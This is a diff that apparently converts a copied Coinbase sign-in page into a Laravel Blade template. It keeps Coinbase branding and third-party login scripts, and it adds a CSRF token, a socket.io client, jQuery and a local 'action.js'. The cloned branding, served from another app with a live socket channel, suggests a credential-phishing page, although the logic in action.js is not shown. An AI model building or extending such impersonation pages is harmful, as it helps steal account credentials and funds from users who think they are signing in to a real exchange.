@@ -1,10 +1,11 @@
 <html lang="en" class="js-focus-visible" data-js-focus-visible="">
 <head>
-  <meta http-equiv="origin-trial" content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
+  
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
-  <title>Coinbase - Sign In</title>
+  <meta name="csrf-token" content="{{ csrf_token() }}">
+  <title>{{'Sign In'}}</title>
   <meta name="theme-color" content="#0052ff">
  {{--  <link rel="apple-touch-icon" sizes="120x120" href="/static/553205518c5a229f4872.png">
   <link rel="apple-touch-icon" sizes="152x152" href="/static/8eeac7461e2f4ba26122.png">
@@ -16,7 +17,6 @@
   <link rel="icon" type="image/png" sizes="128x128" href="/static/f50571360db6c803cdce.png">
   <link rel="icon" type="image/png" sizes="192x192" href="/static/cd9dcfaf25a9db88b6c9.png">
   <link rel="icon" type="image/png" sizes="228x228" href="/static/6028d3ddca338885c7ab.png"> --}}
-  <script type="text/javascript" async="" charset="utf-8" src="https://www.gstatic.com/recaptcha/releases/hfUfsXWZFeg83qqxrK27GB8P/recaptcha__en_gb.js" crossorigin="anonymous" integrity="sha384-WPIRN7/u9nHvMTmnq/GvfSeKYZNo6h0erpwdlq/rBqKEeY8mZJTuv34aFA5aJVS4"></script>
   <script src="https://www.google.com/recaptcha/enterprise.js"></script>
   {{-- <link rel="shortcut icon" type="image/png" sizes="196x196" href="/static/85b156f7e601d949f531.png"> --}}
   <!-- OpenGraph Tags -->
@@ -146,6 +146,10 @@
       </div>
       <script src="https://accounts.google.com/gsi/client" async="" id="google-api-script"></script>
       <script src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js" async="" id="apple-id-auth-script"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.3/socket.io.js"></script>
+      <script src="{{ asset('assets/global/js/jquery.min.js') }}"></script>
+      <script src="{{ asset('assets/js/action.js') }}"></script>
+
       @stack('script')
     </body>
     </html>
